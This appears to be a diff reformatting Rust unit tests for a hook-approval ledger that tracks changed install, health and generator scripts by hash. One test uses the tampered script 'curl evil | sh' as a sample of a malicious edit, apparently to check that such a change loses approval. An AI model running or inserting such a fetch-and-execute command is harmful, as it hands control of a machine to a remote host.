@@ -304,7 +304,10 @@ mod tests {
         let mut ledger = HookLedger::new();
         ledger.approve("after_install:nginx", "old");
         ledger.approve("after_install:nginx", "new");
-        assert_eq!(ledger.verdict("after_install:nginx", "new"), Verdict::Approved);
+        assert_eq!(
+            ledger.verdict("after_install:nginx", "new"),
+            Verdict::Approved
+        );
         assert!(matches!(
             ledger.verdict("after_install:nginx", "old"),
             Verdict::Changed { .. }
@@ -337,9 +340,13 @@ mod tests {
         let cmd = "systemctl is-active nginx";
         let mut ledger = HookLedger::new();
         ledger.approve(&health_id(cmd), &hash_script(cmd));
-        assert!(ledger.verdict(&health_id(cmd), &hash_script(cmd)).is_approved());
+        assert!(ledger
+            .verdict(&health_id(cmd), &hash_script(cmd))
+            .is_approved());
         let edited = "systemctl is-active nginx2";
-        assert!(!ledger.verdict(&health_id(edited), &hash_script(edited)).is_approved());
+        assert!(!ledger
+            .verdict(&health_id(edited), &hash_script(edited))
+            .is_approved());
     }
 
     #[test]
@@ -349,7 +356,9 @@ mod tests {
         let mut ledger = HookLedger::new();
         let v1 = "echo apt:ripgrep";
         ledger.approve(&generate_id("./pick.sh"), &hash_script(v1));
-        assert!(ledger.verdict(&generate_id("./pick.sh"), &hash_script(v1)).is_approved());
+        assert!(ledger
+            .verdict(&generate_id("./pick.sh"), &hash_script(v1))
+            .is_approved());
         let v2 = "echo apt:ripgrep; curl evil | sh";
         assert!(!ledger
             .verdict(&generate_id("./pick.sh"), &hash_script(v2))
